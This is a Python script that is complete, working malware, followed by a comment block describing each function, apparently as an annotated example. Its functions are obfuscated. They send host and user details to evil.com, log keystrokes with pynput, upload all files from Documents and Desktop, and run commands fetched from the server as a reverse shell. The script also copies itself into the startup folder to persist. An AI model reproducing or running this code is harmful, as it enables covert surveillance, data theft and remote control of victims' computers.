import os
import shutil
import requests
import subprocess
import sys
import time
import threading
import socket
import base64

def xj9k_ds71():
    try:
        usr = os.getlogin()
        hst = socket.gethostname()
        ip = socket.gethostbyname(hst)
        return f"User: {usr}, Host: {hst}, IP: {ip}"
    except:
        return "Unknown System"

def vkmx_4820():
    try:
        d4t4 = xj9k_ds71()
        enc = base64.b64encode(d4t4.encode()).decode()
        requests.post("http://evil.com/data", data={"payload": enc})
    except:
        pass

def ylxq_9321():
    try:
        from pynput import keyboard

        def on_press(key):
            try:
                with open(os.path.join(os.getenv("TEMP"), "log.txt"), "a") as f:
                    f.write(f"{key.char}")
            except:
                pass

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    except:
        pass

def bdjx_2950():
    try:
        dirs = [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop")]
        server = "http://evil.com/upload"

        for directory in dirs:
            if os.path.exists(directory):
                for root, _, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        with open(file_path, "rb") as f:
                            requests.post(server, files={"file": f})
    except:
        pass

def wtfq_8391():
    try:
        while True:
            cmd = requests.get("http://evil.com/command").text
            if cmd.lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            requests.post("http://evil.com/result", data={"output": output})
            time.sleep(5)
    except:
        pass

def fqiu_4857():
    try:
        script_path = os.path.abspath(sys.argv[0])
        startup_dir = os.path.expanduser("~/.config/autostart/") if sys.platform != "win32" else os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        
        if sys.platform == "win32":
            shutil.copy(script_path, startup_dir)
        else:
            os.system(f"cp {script_path} {startup_dir}")
    except:
        pass

def prtc_9903():
    try:
        vkmx_4820() 
        threading.Thread(target=ylxq_9321).start()  
        threading.Thread(target=bdjx_2950).start()  
        threading.Thread(target=wtfq_8391).start() 
        fqiu_4857() 
    except:
        pass

if __name__ == "__main__":
    prtc_9903()



"""
function xj9k_ds71
    get the system information and return string contain this information

function vkmx_4820
    call xj9k_ds71 to get the system information and send it to evil.com usiing post

function ylxq_9321
    import pynput.keybord (a keylogging library)
    define on_press function to logs keystorkes to a file log.txt
    to loge every keystroke the user makes

function bdjx_2950
    it a function to iterate through the file in directories and send each file to evil.com using post

function wtfq_8391
    a function to get command from evil.com to create a reverse shell

function fqiu_4857
    a function to make the malware run every time the computer starts

function prtc_9903
    call the other malicious function














